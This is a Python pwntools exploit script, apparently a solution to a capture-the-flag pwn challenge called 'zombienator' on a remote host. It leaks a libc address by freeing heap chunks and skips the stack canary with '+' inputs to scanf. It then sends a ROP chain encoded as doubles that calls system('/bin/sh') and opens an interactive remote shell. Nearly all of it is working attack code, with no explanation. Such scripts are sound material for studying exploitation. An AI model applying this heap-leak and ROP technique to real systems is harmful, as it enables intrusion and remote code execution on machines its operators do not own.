#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 94.237.58.222 --port 52160 zombienator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('zombienator')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '94.237.58.222'
port = int(args.PORT or 52160)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'
import struct

def cmd(i):
    io.sendlineafter(b">> ",str(i).encode())

def prompt(m):
    io.sendlineafter(b": ",m)

def prompti(i):
    prompt(str(i).encode())

def create(sz,idx):
    cmd(1)
    prompti(sz)
    prompti(idx)

def remove(idx):
    cmd(2)
    prompti(idx)

def display():
    cmd(3)

def attack(ps):
    cmd(4)
    prompti(35+len(ps))
    for i in range(35):
        prompt(b"+")
    for p in ps:
        prompti(struct.unpack("<d",p64(p))[0])


io = start()

# leak libc
for i in range(8):
    create(130,i)

for i in range(8)[::-1]:
    remove(i)

display()
io.recvuntil(b"]: ")
lk = io.recvline()[:-1]
leak = unpack(lk,"all")
log.info(hex(leak))
libc = exe.libc
libc.address = leak - 0x219ce0
log.info(f"libc : 0x{libc.address:x}")

pop_rdi = libc.address + 0x2a3e5
pop_rsi = libc.address + 0x2be51
pop_rdx = libc.address + 0x796a2

binsh = next(libc.search(b"/bin/sh\0"))
rop = [pop_rdi,0,libc.sym.dup,pop_rdi,binsh,libc.sym.system]
attack(rop)




io.interactive()

